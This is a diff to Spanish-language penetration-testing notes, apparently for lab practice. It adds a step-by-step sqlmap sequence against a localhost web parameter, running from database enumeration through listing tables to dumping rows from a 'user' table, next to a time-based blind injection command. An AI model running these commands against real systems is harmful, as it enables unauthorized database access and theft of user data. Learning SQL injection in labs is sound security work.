@@ -88,6 +88,14 @@ Si se puede lelvar la info fuera del servidor
 
 - sqlmap -r request_time.txt -p descripción --technique=T --risk=3 --level=3 --current-db --dbms=mysql --flush-session
 
+### Orden para usar SQLMAP
+
+- sqlmap -r request.txt
+- sqlmap -u 'http://localhost/' -p idmagento(parameter) --dbs
+- sqlmap -u 'http://localhost/' -p idmagento(parameter) --current-db
+- sqlmap -u 'http://localhost/' -p idmagento(parameter) -D magento --tables
+- sqlmap -u 'http://localhost/' -p idmagento(parameter) -D magento -T user --start=1 --stop=10
+
 ---
 
 ## ♟️ Estratégia
